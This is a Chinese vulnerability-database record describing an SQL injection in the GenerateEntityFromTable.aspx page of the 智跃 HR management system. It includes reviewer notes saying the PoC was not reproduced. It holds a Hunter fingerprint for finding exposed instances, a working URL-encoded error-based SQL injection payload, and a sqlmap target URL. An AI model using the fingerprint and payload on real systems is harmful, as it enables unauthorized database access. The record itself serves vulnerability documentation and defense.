---
source: "wy876 漏洞文库"
title: "智跃人力资源管理系统 GenerateEntityFromTable t SQL注入"
product: "智跃人力资源管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server，版本未知"
prerequisites: "只有URL，身份要求不清"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/zwvy0quhfwnddcae"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%99%BA%E8%B7%83%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%99%BA%E8%B7%83%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FGenerateEntityFromTable.aspxSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"ZY.LOGO.64.png\""
id: "vw-bfa3abb4d21da1dabb9791ab"
entity_id: "ve-bfa3abb4d21da1dabb9791ab"
schema_version: "1"
---

# 智跃人力资源管理系统 GenerateEntityFromTable t SQL注入

## 条目说明

- 对象与具体问题：智跃人力资源管理系统；GenerateEntityFromTable t SQL注入
- 版本、配置及部署条件：SQL Server，版本未知
- 认证与权限前提：只有URL，身份要求不清
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 资源utils代码生成工具是否生产应暴露及权限需核，不能泛称获取数据库权限
- 只有MD5(1230)错误表达式及基准URL，无返回/源码/修复
- Hunter字段错存fofa，补规范请求和精确版本

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
智跃人力资源管理系统是基于B/S网页端广域网平台，一套考勤系统即可对全国各地多个分公司进行统一管控，成本更低。信息共享更快。跨平台，跨电子设备。智跃人力资源管理系统 GenerateEntityFromTable.aspx SQL注入漏洞，攻击者可通过该漏洞获取数据库权限。

## 二、影响版本
+ 智跃人力资源管理系统

## 三、资产测绘
+ hunter`web.body="ZY.LOGO.64.png"`
+ 特征


## 四、漏洞复现
```plain
/resource/utils/GenerateEntityFromTable.aspx?t=1%27%2B(SELECT%20CHAR(103)%2BCHAR(87)%2BCHAR(114)%2BCHAR(112)%20WHERE%201669%3D1669%20AND%206492%20IN%20(select%20SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES(%27MD5%27,%271230%27)),3,32)))%2B%27
```


sqlmap

```plain
/resource/utils/GenerateEntityFromTable.aspx?t=1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zwvy0quhfwnddcae>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
